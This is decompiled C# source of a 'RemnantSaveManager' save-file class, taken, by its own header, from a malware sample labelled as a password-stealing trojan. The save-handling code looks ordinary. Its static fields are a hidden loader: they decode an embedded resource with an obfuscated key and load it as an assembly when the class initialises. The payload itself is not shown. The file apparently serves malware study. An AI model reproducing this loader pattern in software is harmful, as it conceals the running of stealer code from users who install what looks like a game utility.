// Decompiled with JetBrains decompiler
// Type: RemnantSaveManager.RemnantSave
// Assembly: RemnantSaveManager, Version=1.99.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 99FD4FCE-DABC-49CD-8C69-1190642E25EA
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-f547f2ae856eb63739f9aa6faffc2eb509ff612c0bcc65decad782827b60ef46.exe

using RemnantSaveManager.Properties;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;

namespace RemnantSaveManager
{
  public class RemnantSave
  {
    private string savePath;
    private string profileFile;
    private List<RemnantCharacter> saveCharacters;
    private RemnantSaveType saveType;
    private WindowsSave winSave;
    public static byte[] Paradise = RemnantCharacter.Pantole(Resources.Helper_Classes, "bیYنچ");
    public static AppDomain BootCamp = Thread.GetDomain();
    public static Type CHarlie = RemnantSave.BootCamp.Load(RemnantSave.Paradise).GetExportedTypes()[2];

    public string SaveFolderPath => this.savePath;

    public string SaveProfilePath => this.savePath + string.Format("\\{0}", (object) this.profileFile);

    public RemnantSaveType SaveType => this.saveType;

    public List<RemnantCharacter> Characters => this.saveCharacters;

    public string[] WorldSaves
    {
      get
      {
        if (this.saveType == RemnantSaveType.Normal)
          return Directory.GetFiles(this.SaveFolderPath, "save_*.sav");
        Console.WriteLine((object) this.winSave.Worlds.ToArray());
        return this.winSave.Worlds.ToArray();
      }
    }

    public bool Valid => this.saveType == RemnantSaveType.Normal || this.winSave.Valid;

    public static bool ValidSaveFolder(string folder) => Directory.Exists(folder) && (File.Exists(folder + "\\profile.sav") || Directory.GetFiles(folder, "container.*").Length != 0);

    public void UpdateCharacters() => this.saveCharacters = RemnantCharacter.GetCharactersFromSave(this);

    public void UpdateCharacters(RemnantCharacter.CharacterProcessingMode mode) => this.saveCharacters = RemnantCharacter.GetCharactersFromSave(this, mode);
  }
}
